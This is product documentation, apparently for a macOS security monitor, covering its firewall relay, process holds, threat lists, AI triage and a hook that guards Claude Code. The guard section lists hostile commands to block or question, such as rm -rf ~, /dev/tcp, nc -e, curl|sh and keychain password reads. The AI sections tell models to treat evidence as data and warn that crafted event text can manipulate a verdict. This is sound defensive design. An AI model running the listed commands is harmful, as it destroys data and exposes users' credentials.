Both signals pass *Only Important* and *Only New*. On ~2 hours of real history there were 0 beacons and 0 raw-IP
alerts. The one periodic flow (Slack → slack.com every ~125 s) was correctly ignored.

**Homebrew tools.** Homebrew ad-hoc-signs what it builds, so signing can't vouch for `git`, `kubectl`, `fish`…. They're
judged by the path rules like your own builds, and you decide their patterns.

*End Now* for domain learning is in Settings ▸ Detection.

#### Firewall

Choose how strict to be: only watch, ask you about each new connection, or allow only what you've approved.

Pick a mode in *Settings ▸ Firewall*: **Off**, **Watch**, **Ask** or **Strict**. The connections themselves are in the
**Network** tab (⌘5), next to the domains (see below).

- **Watch:** judges every connection and lists what wouldn't simply pass. Watch blocks nothing.
- **Ask:** something new waits, with no time limit, while a window asks you **Allow / Block**.
- **Strict:** something new is refused.

**How a connection is judged.** Watch judges every connection Hostwatch sees, TCP and UDP, with the firewall's rules
(`FirewallPolicy`). The first rule that matches wins:

1. Local network (loopback, LAN, link-local, multicast) and Hostwatch itself pass.
2. A known malware address blocks, even if Safe.
3. A pattern marked Suspicious or Dangerous blocks.
4. Safe passes.
5. Then by risk: high-risk blocks, and routine (macOS, trusted developers) passes.
6. A sealed macOS binary that isn't a shell or tool passes.
7. Anything else new is asked about.

What wouldn't simply pass is listed in the Network tab: the last 7 days, at most 500, kept in `firewall-watch.json`.
Each entry is judged again with its pattern's current status. Allow / Block mark the pattern Safe / Suspicious.

**How Ask and Strict stop connections.** Ask and Strict turn on the relay in the collector (`AgentFirewall`,
`FirewallRelay`, `PFRedirect`). The relay is a go-between that new connections pass through, so they can be held or
refused.

pf rules in the anchor `com.apple/hostwatch` (inside Apple's, which `/etc/pf.conf` loads) send connections over `lo0`
to the relay on port 46110 (loopback only).

- **Redirected:** every new outgoing TCP and UDP connection of non-root users, IPv4 and IPv6, on every interface.
- **Not redirected:** `_mdnsresponder`, and loopback, LAN, link-local, multicast and CGNAT.
- **Already open:** connections already open aren't touched.

For each connection, the relay:

1. Finds the original destination (`DIOCNATLOOK`, else pf's state table).
2. Finds the program: the process holding the client's port (`SocketOwner`).
3. For TLS, peeks at the server name. Nothing is decrypted.
4. Asks the app (`fw_ask`). There is one question per program, protocol, destination and port, however many
   connections wait.

The app answers with the rules:

- **Allowed:** passes, remembered 5 min.
- **Blocked:** refused (1 min).
- **Something new:** refused in Strict. In Ask it waits, with no time limit, while its own window asks **Allow /
  Block**.

**The question window.** There is one window per question, in the middle of the screen. Your answer marks the pattern
Safe or Suspicious and answers its other waiting connections.

*Ask Claude* in a question window gathers the same evidence as Ask AI: signature, location, parent, quarantine and the
connection, with the firewall's question first. The window then shows Claude's short advice: **Allow** or **Block** and
why, then the program, the destination and the risks, with a verdict and 0–100 risk badge. It never answers for you.

**Changing mode or losing the app.**

- **Leaving Ask:** what still waits is decided by the new mode. Off or Watch: pass. Strict: refused.
- **Without the app:** Strict refuses and Ask passes.

**How traffic is relayed.** TCP is relayed with BSD sockets, and half-closes are passed on exactly. UDP is relayed as
flows, ended after 60 s quiet, or 10 s for DNS. Relayed flows the other sources missed, UDP mostly, become net events.

**Fail-safes.** The redirect is removed:

- when the mode leaves Ask/Strict
- when the collector stops
- by a watchdog in its own session, when the collector's process is gone
- at the next collector start (stale rules)
- at reboot, because anchors live in memory
- when the web check through the relay (`curl` as `nobody`, every 30 s) fails twice. This also switches the app back
  to Watch.

**Not covered:** programs running as root, macOS's DNS lookups, and the local network. Hostwatch itself always passes.

**Test tools** (run as root):

- `--firewall-probe`: two test destinations.
- `--firewall-relay-test [s]`: your real traffic through the relay, blocking nothing.

**Containers and virtual machines.** Docker Desktop runs containers in a Linux VM. On macOS, a container's connection
is opened by Docker's backend (`com.docker.backend`), so the program inside (curl, pip…) can't be seen.

Connections of these VM gateways are judged **per destination**: Docker's backend and vpnkit, Podman's `gvproxy`,
OrbStack's helper, `limactl` and QEMU (`SignatureBuilder.vmGateways`). The pattern is `TCP pypi.org:443`, not
`TCP internet:443`. They never pass on the gateway's trusted signature.

- **Asked once per domain:** each new domain a container reaches is asked about once ("A Docker container wants to
  connect to pypi.org").
- **Block applies to all:** Block stops it for every container.

VMs with bridged or shared (NAT) networking send packets from the VM's own interface, not from a Mac process, so the
relay never sees them.

In a firewall question, **Ask Claude** has the shortcut ⌘K.

### Steps in when needed

When something looks wrong, pause it, or watch it closely to see what it does.

#### Launch and file protection (Rules ▸ Protection)

Hostwatch can show what it would stop: a launch, or a program reading places like your SSH keys. It decides the way
the firewall does. Your decision on the pattern comes first, then its risk, then macOS's own programs pass. Shells,
curl and other programs that run whatever they're told are judged by what they run.

- **Modes per area:** Launches and Files each have Off, Watch, Ask and Strict. Watch is the default. It stops
  nothing, it marks what would be stopped and counts what would be asked about.
- **Stopping for real needs Endpoint Security.** Ask and Strict are unavailable until Apple approves Hostwatch's
  Endpoint Security access and the collector can use it. The page says which.
- **Protected files:** cards for SSH keys, developer credentials (cloud, Kubernetes, registries, GitHub, GPG),
  keychains, browser passwords and cookies, Messages and Mail, privacy settings and accounts, and autostart locations
  (writes only). The programs expected there pass. For everyone else a card asks, or blocks. A card can be off.
- **What protection found:** each launch or file access that would be stopped or asked about, folded by pattern.
  *Allow* marks the pattern Safe, *Block* marks it Dangerous, and it leaves the list. Deciding it anywhere else does
  the same.
- **In Events:** a red no-entry sign after the status marks what would be stopped, with the reason in its tooltip.
  Questions are only counted, so the list stays quiet.
- **Pause for 15 Minutes** stops everything, rehearsal included. The window's subtitle says *Rehearsing*,
  *Protecting* or *Protection paused*.

#### Hold suspicious processes (opt-in)

Optional: when a process does something clearly dangerous, Hostwatch pauses it and asks you whether to let it go on
or stop it.

This gives you a chance to stop a harmful step before it finishes. Turn it on in
*Settings ▸ Detection ▸ Hold suspicious processes* or from the menu bar icon. It is off by default.

When an event adds a strong story stage, Hostwatch pauses the process by sending it `SIGSTOP`. A floating panel then
asks you what to do:

- **Allow:** the process goes on.
- **Always Allow:** the process goes on, and the pattern is marked Safe.
- **Kill:** the process is stopped for good.
- **Ask AI:** an AI looks at the evidence and explains it.

These strong stages trigger a hold:

- a piped or encoded command
- a credential read
- a login item
- quarantine removal
- running a just-dropped file
- a swapped binary

A program that is a new high-risk pattern is held too.

- **No answer in 60 s:** Hostwatch lets the process continue (the default) or kills it. You choose this with
  *If No Answer in 60 s*.
- **Only your processes:** The app runs as you, so it can't hold root's or other users' processes.
- **Never held:** patterns marked Safe, Hostwatch itself, launchd, system UI (`/System/Library/CoreServices`,
  `/System/Applications`), and terminals or editors.
- **At most 5 holds at once.**
- **Safe signalling:** The pid's path is checked before every signal. An exited pid that was reused by another
  program is left alone.
- **Fails open:** Each hold starts a detached watchdog (`sleep 65; kill -CONT pid`). So a process can't stay frozen
  if Hostwatch quits or crashes. Quitting or turning the hold off resumes everything.
- **Best effort:** Events arrive after the fact, so a quick `curl` can finish before it is stopped. Slower steps,
  such as installers, scripts and long downloads, are caught. Blocking before execution would need Endpoint Security
  AUTH events or a Network Extension filter.

#### Watch Closely

Curious what a program really does? Record it, and everything it starts, for a minute, then read a plain summary of
its files, network and system changes.

Use it when you don't trust a program and want to see exactly what it does on your Mac.

1. Right-click an event, or choose Activity ▸ *Watch Selected Process Closely…* (⌥⌘W).
2. Hostwatch records what its process, and every process it starts, does for 30 s to 5 min. The default is 1 min.
   The window's duration menu offers 30 seconds, 1, 2 or 5 minutes.
3. Recording ends at the time limit, when you click *Stop*, when every watched process has exited, or when the app
   goes away.
4. Read the result. **Watch Again** records once more.

**What the window shows.** **What stands out** comes first. These are local rules that flag:

- persistence
- privacy changes
- injection into or control of other processes
- privilege changes
- keychains, SSH and cloud keys, browser data
- launch agents
- removed quarantine
- executables made in temporary folders
- mass renames

Below that you see processes as a tree, then network, other processes, persistence, privileges, system, services,
files grouped by folder (changes first) and event counts.

**Ask an AI about it.** When recording ends, **Ask** explains the result with Claude or Apple's on-device model. You
pick with the engine switch, as in Ask AI. The evidence is the profile, most telling first, with the signer and
parent chain. You can edit it before sending, and secrets are masked.

**What is recorded.** The collector runs a second `eslogger` with about 60 Endpoint Security event types
(`BehaviorRecorder.events`, those this macOS knows). Endpoint Security is the macOS interface that reports system
activity. The event types cover:

- file create, write, rename, delete, permissions and quarantine changes
- code loaded and memory made executable
- signals, task ports, debugging and thread injection into other processes
- setuid, sudo, authorization
- XPC and Unix-socket connections
- login items, configuration profiles, privacy (TCC) changes
- kernel extensions, drivers, mounts and more

The collector's own connection sources add the network.

**Technical notes.**

- Lines are checked for the tree's pids before they're parsed, so other processes cost almost nothing.
- The result is a behaviour profile (`BehaviorProfile`), never the raw events. It is sent to the app every 2 s.
- To test it as root, run `sudo Hostwatch --watch-test <pid> [seconds]`. It prints the highlights and the evidence.

### Knows known threats

Public threat lists, checked on your Mac every day.

#### Known threats and exploited macOS vulnerabilities

Once a day Hostwatch fetches public lists of malware servers and files and checks your Mac against them. It also
tells you when your macOS has holes that attackers are actively using.

The lists are downloaded once a day. You can also click *Update Now* in Settings ▸ Detection. The matching happens
on this Mac: nothing about the Mac is sent.

| List | What | Key |
|------|------|-----|
| HaGeZi Threat Intelligence (Medium) | ~320k malware, phishing and C2 domains, ~35k IPs | none |
| Feodo Tracker | active botnet command servers | none |
| ThreatFox | C2 domains, IPs (and ports), URLs' hosts and file hashes, with the malware family (last 7 days, kept 180) | free abuse.ch key |
| MalwareBazaar | malware file SHA-256 (last 48 h, kept 180 days) | free abuse.ch key |
| CISA Known Exploited Vulnerabilities | Apple flaws exploited in the wild | none |

C2 means "command and control": servers that attackers use to steer infected machines.

**What is checked.**

- **Every connection:** its hostname and each parent domain (`a.b.evil.com` → `evil.com`), then its IP and IP:port.
- **Every launch of an untrusted program:** Untrusted means unsigned, ad-hoc, quarantined, or from a download or
  temp folder. The program is hashed (SHA-256, once per file version). With the key, the hash is checked against the
  file lists.

**What a match does.** A match is the story stage *Known malware*. On its own it makes a story and makes it
**Dangerous**, even for a pattern you marked Safe.

- The row gets a red `KNOWN BAD` tag in Events and the HUD.
- The domain gets a red badge and risk score 100, with the reason.
- The tray shows a line.
- After each update, the last 30 days of domains, and programs already hashed, are checked again. Matches found this
  way are shown as *contacted earlier*.

**macOS vulnerabilities.** Hostwatch takes CISA's Apple entries for macOS, or for several Apple systems including it.
It compares them with the date of your last macOS update and any update waiting in Software Update
(`softwareupdate --list --no-scan`).

- CISA doesn't name fixed versions. So a flaw listed before your last update is shown as *likely fixed*.
- Later ones are shown as *fixed by the waiting update* or *not fixed by your last update*.
- A banner in the window and a list show them. The list gives the CVE, component, ransomware use and Apple advisory.
- The tray says when an update fixes exploited flaws.
- Dismissing the vulnerability banner is remembered until another flaw is listed.
- The banner's list has **Open Software Update**.

**Storage.** The abuse.ch key is kept in the Keychain. Lists are cached in
`~/Library/Application Support/Hostwatch/intel`, readable only by you and never executable.

**A download can't become anything but a list.**

- Lists are only read, never run.
- They are fetched over HTTPS, with no cookies or cache. Redirects are followed only within the same server.
- Before a download replaces the previous copy, it must be text. Programs, archives, documents and scripts are
  refused: Mach-O, ELF, PE, zip, gzip, PDF, xar and `#!`.
- It must be within a plausible size.
- It must have the right shape line by line: ≥ 95% valid domains or IPs. The CISA list needs ≥ 500 entries.
- A list that suddenly shrinks by half or grows five-fold is refused too.
- A refused update keeps the previous list and shows why in Settings ▸ Detection.

**Poisoning can't flag the platforms everything uses.** "Poisoning" means tampering with a list to flag a popular
domain.

- Apple, Google, Microsoft, GitHub, AWS, Cloudflare, Akamai and a few others are never flagged by their own domain,
  nor by a parent-domain match.
- A phishing page on a shared host is still flagged by its full name (`login-apple.github.io`).
- A list can only raise alerts: it can never make Hostwatch trust anything.

### AI when you want it

AI explains and helps decide, only when you ask, on your Mac or with Claude.

#### Ask AI: is this dangerous?

Not sure about something? Double-click it: an AI looks at the evidence on your Mac and explains in plain words whether
it's dangerous.

1. In the activity window, **double-click** any process, connection or file row. Or right-click it →
   **Ask AI: Is This Dangerous?…**.
2. With Claude as the engine, a window opens and collects local evidence (listed below).
3. **Review and edit the evidence before sending.** Obvious secrets are masked automatically: bearer tokens,
   `--password=`, URL credentials, `ghp_`, `sk-` and `AKIA…` keys.
4. Click the send button (⌘↩). It reads **Ask Claude**, **Ask On-Device** or **Ask Again**.
5. The answer streams in, with a **SAFE / SUSPICIOUS / DANGEROUS / UNKNOWN** badge.

The window also has **Re-collect** (gather the evidence again), **Copy Answer** and **Cancel**.

**Evidence collected:**

- `ps` details and the parent process chain
- code signature and Team ID, Gatekeeper (`spctl`), quarantine flag, SHA-256, file metadata
- reverse DNS and the process's current connections (network events)
- file type and flags (file events)
- other recent activity from the same PID

**How Claude is run.** With Claude, Hostwatch runs Claude Code headless (without its interface):

```
claude -p --output-format stream-json --include-partial-messages --no-session-persistence \
       --setting-sources "" --strict-mcp-config --tools "" --system-prompt "<analyst prompt>"
```

- **Login:** It uses your existing Claude Code login. No extra API key is needed.
- **Isolation:** Your hooks, plugins and MCP servers are skipped, and no session is saved.
- **No tools by default:** The evidence may be attacker-controlled. So by default Claude gets **no tools** and is told
  to treat the evidence only as data.
- **Read local files:** This is opt-in (`Read`/`Grep`/`Glob`, read-only).
- **Finding `claude`:** It is looked up in `~/.local/bin`, `~/.claude/local`, Homebrew and `/usr/local/bin`, then
  your login shell. Set `CLAUDE_PATH` to override.
- **Privacy and cost:** Evidence you send goes to Anthropic. A typical question takes about 10 s and costs about
  $0.02–0.05.

#### AI engine and triage

Pick the AI: Apple's on-device model keeps everything on your Mac. Claude is stronger and sees only what you send it.

**Settings ▸ AI** picks which AI Hostwatch uses. It also shows the on-device model's status.

| Engine | AI suggestions for patterns | Ask AI (event or story) |
|--------|------------------------------|-------------------------|
| **Apple On-Device (private)** | on-device only, what it can't settle stays New | on-device model |
| **Claude** | Claude only | Claude |
| **On-Device First, Claude for the Rest** (default) | steps 1 and 2 below | Claude |

Earlier versions' two toggles are migrated to the matching engine.

**Per question.** The Ask window also has a **Claude / On-device** switch for each question.

- On-device answers use the same format, with the VERDICT line first.
- The evidence is shortened to ~6,000 characters to fit the model's ~4,000-token context window (how much text it can
  read at once).
- Reading local files is Claude-only.
- An on-device "SAFE" from Ask never marks a high-risk pattern Safe.

**Model state.** The menu shows the model's state: ready, still downloading, Apple Intelligence off, or Mac not
eligible (Intel). When unavailable, everything goes to Claude as before.

**Classification steps.** Triage means sorting new patterns by AI before you look at them.

1. **On-device pass** (engines with on-device): Apple's on-device model (`SystemLanguageModel`, never Private Cloud
   Compute) looks at each pattern on its own. It sees the program, activity, signer and trust, local risk and count.
   Secrets are masked and the text is marked as data. It answers SAFE / SUSPICIOUS / DANGEROUS / UNSURE with a
   confidence (structured output, greedy decoding).
2. **Claude** (engines with Claude): one Claude call for whatever step 1 did not settle.

Routing (`TriageRouter`, unit-tested):

| On-device says | Normal-risk pattern | High-risk pattern |
|----------------|---------------------|-------------------|
| SAFE, high confidence | **settled Safe** (source *on-device*) | Claude, else left for you |
| SAFE medium/low, UNSURE | Claude, else left for you | Claude, else left for you |
| SUSPICIOUS / DANGEROUS | Claude, else flagged (*on-device*) | Claude, else flagged |
| model unavailable | Claude, else left for you | Claude, else left for you |

**No AI verdict ever marks a high-risk pattern Safe.** This holds for the on-device model and Claude, in triage,
Classify New and Ask AI. Event text such as file paths, process names and hostnames can be crafted to talk a model
into it. So a high-risk pattern stays New until you decide. AI verdicts never remove steps from Stories either. Only
your own decisions do.

**Apple's safety filter.** The on-device model has built-in guardrails. They can refuse text that looks like hacking
or credential theft, which is what security evidence is.

- Ask AI uses Apple's `permissiveContentTransformations` mode, meant for analysing such text.
- If the model still refuses, Hostwatch retries once with the core evidence (event, process, parent chain,
  executable) and says so.
- If that is refused too, it explains why and suggests Claude.
- Background triage treats a refusal as "couldn't decide". The pattern goes to Claude or stays New.
- `HOSTWATCH_LIVE_MODEL_TESTS=1 swift test --filter OnDeviceModel` runs the real model on security evidence (needs
  Apple Intelligence).

**Claude usage** (Settings ▸ AI) shows the tokens and cost of every Claude run Hostwatch made: Ask AI, classifying
patterns and Suggest Rules.

- It is counted across launches from each `claude -p` result (`usage`, `total_cost_usd`).
- It reads like "1.2M tokens · $3.41", with runs and the start date under it.
- The tooltip breaks it down per feature and into input/cached/output.
- Failed runs that still reached Claude count too.
- **Reset** starts from zero. *Reset Hostwatch* with settings clears it.
- The on-device model is free and isn't counted.

#### Claude Code guard

If you use Claude Code, Hostwatch checks each command it wants to run and stops the dangerous ones before they happen.

An AI coding assistant can be tricked into running harmful commands. The guard checks each call first. Turn it on in
*Settings ▸ AI ▸ Claude Code guard*. It is off by default.

**What each verdict does:**

- **Block:** The call gets `deny`. It doesn't run, and Claude is told why and to ask you to run it yourself.
  Examples:
  - `rm -rf ~`, `/`, `~/Documents`, `find ~ -delete`
  - `/dev/tcp`, `nc -e`
  - `diskutil eraseDisk`, `dd of=/dev/…`
  - a fork bomb
  - `csrutil disable`, `spctl --master-disable`
  - editing TCC.db
  - a secret sent to a paste or webhook site
  - a known malware domain or IP
  - deleting or changing Hostwatch's files
- **Ask:** The call gets `ask`. Claude Code asks you, with the reason. Examples:
  - `curl … | sh`, `bash <(curl …)`, `base64 -d | sh`
  - `sudo`, `osascript`
  - launch agents, shell startup files, `authorized_keys`, `/etc`, Claude Code's own settings
  - `launchctl load`, `crontab`
  - `security find-generic-password -w`, SSH keys, AWS/GitHub/Docker/Kubernetes credentials, browser data. This also
    applies via Read/Grep, whose content would go to Claude.
  - `xattr -d com.apple.quarantine`
  - recursive deletes outside the project, `$VAR/` deletes
  - a bare public IP
  - `pkill Hostwatch`
  - scripts run with `bash x.sh` or written by Claude that do any of this
- **Nothing:** Everything else. Claude Code's normal permissions apply.

**It can only make Claude Code stricter.** Hostwatch never answers `allow`.

- When Claude Code won't ask (`bypassPermissions`, `dontAsk`), a Hostwatch panel asks instead. Block is the default,
  and no answer in 60 s blocks.
- The panel has **Allow Once** and **Block** with a countdown.
- In `claude -p` runs, Claude Code turns `ask` into a refusal by itself.
- Hostwatch's own Claude runs don't load user settings, so they aren't checked.

**Log and status.**

- The log (*Show Log…*) keeps the last 300 blocked or asked calls, with secrets masked. It is kept in
  `claude-guard.json` (the last 300 entries), and its window has **Clear Log**.
- The tray shows blocks in the last 24 hours.
- The hook's state is checked every 30 s. It covers two cases: the hook removed from the settings (*Restore*), or all
  hooks switched off by `disableAllHooks`.

**Limits.** It judges the text of a call, so well-hidden code can get through. Hostwatch's monitoring still sees what
then runs.

**How it is installed.** Turning it on adds a `PreToolUse` hook to Claude Code's user settings
(`~/.claude/settings.json`). The original is kept as `settings.json.before-hostwatch`.

- Matcher: `Bash|Write|Edit|MultiEdit|NotebookEdit|Read|Grep|WebFetch`
- Command: `'<Hostwatch>' --claude-hook`
- Timeout: 90 s

The hook takes about 15 ms. It passes the call to the app over a private Unix socket
(`~/Library/Application Support/Hostwatch/guard/claude.sock`, 0600, same user only). If the app isn't running, the
hook judges the call itself with the same rules, without the threat lists.

Settings ▸ AI also shows the hook as a fragment to copy into a project's `.claude/settings.json` or the managed
settings.

#### MCP server

Let Claude Code read your Hostwatch history and stories (read only), so you can ask it about your Mac's activity.

MCP (Model Context Protocol) is the standard way Claude Code connects to other tools. With it, you can ask Claude Code
questions like what ran on your Mac yesterday, and it reads the answer from Hostwatch.

**Set it up.** Access is off by default.

1. Turn on *Settings ▸ AI ▸ Use with Claude Code*, or use *Help ▸ Use with Claude Code…*.
2. Hostwatch creates a random token (`hwmcp_` + 64 hex) and shows the command to run once:
   `claude mcp add --scope user hostwatch -e HOSTWATCH_MCP_TOKEN=<token> -- <path to Hostwatch.app>/Contents/MacOS/Hostwatch --mcp`
   The command first removes an older `hostwatch` registration.
3. The token is shown once. Hostwatch keeps only its SHA-256 in `mcp-token.sha256` (mode 600) and compares in constant
   time.

**What Claude Code can ask:**

| Tool | What it returns |
|------|-----------------|
| `hostwatch_overview` | collector state, pattern counts by status (new high-risk too), open stories, new domains, history span and size, AI engine |
| `search_events` | recorded events newest first: `query` (text in name/path/target/host/command line, `~` = home, case-insensitive for the usual spellings), `kind`, `pid`, `since`/`until` (`30m`, `24h`, `7d`, `today`, `yesterday`, ISO 8601, default last 24 h), `limit` (≤ 300) |
| `search_patterns` | patterns with status/risk/count/first/last/who decided: `query`, `status` (new/safe/suspicious/dangerous/flagged), `risk`, `kind`, `sort` |
| `list_stories`, `get_story` | stories (numbered newest first) and one story's full timeline (`id` = number or id prefix) |
| `list_domains` | domain inventory: `only_new`, `query`, `limit` |
| `process_tree` | ancestors (respecting PID reuse: the latest start of a pid before its child), children during the process's lifetime, its recent connections and file activity |
| `find_processes` | processes that ran in a time range (`query`: name, path, command line, user or pid, and `since`/`until`): start, end or still running, CPU time, peak memory, bytes written, user, parent, command line. From the once-a-minute process lists, plus recorded starts for processes that lived under a minute |
| `agent_sessions` | coding-agent sessions Hostwatch follows or followed in the last 30 minutes: pid, project, start and end, launches, file opens, connections, new patterns. `trace_process` with the pid shows what one did |
| `trace_process` | one process's life (`pid`, `at` to pick the run when a pid was reused, and `children`): ancestors, child tree, CPU/memory/disk use over its life, what it (and its tree) ran, opened and connected to, and a timeline. For a process running for days, children and activity cover its last 6 h. A huge tree is followed for its first 200 descendants |
| `signing_info` | signer, Team ID, ad-hoc, quarantine, Apple, trusted, replaced-at-path, full validity check |

**Access control.**

- **Refusals:** With access off, or a missing or outdated token, the server answers every request with an error
  (`-32001`) saying how to fix it. It serves no data.
- **New Token…** invalidates earlier registrations. Turning access off invalidates all of them.
- **Access log:** Each session start is recorded in `mcp-access.log`: time, allowed/refused, and the program that
  started it. The last five show in Settings.
- **Limits of a token:** It keeps out MCP clients you didn't set up, and makes access revocable and visible. A
  program already running as your user could still read Hostwatch's files directly, as it can any of your files.

**Safety.**

- Every tool is annotated read-only. There are no tools that change anything.
- Output is masked with the same rules as Ask AI and capped at 40,000 characters.
- The server's instructions tell Claude to treat the data as evidence, never as instructions.

**Technical details.**

- **Transport:** It is a read-only server over stdio (JSON-RPC, protocol versions 2025-06-18, 2025-03-26,
  2024-11-05). There's no network listener: Claude Code starts the process and talks over stdin/stdout.
- **Data:** It reads `signatures-v2.json`, `stories.json`, `domains.json` and the history files. Saved data is at
  most ~30 s behind the app. It works when the app is closed.
- **Search:** History is streamed with byte-level search (memchr/memmem). Only files that can contain the range are
  read, up to 2 GB per query.
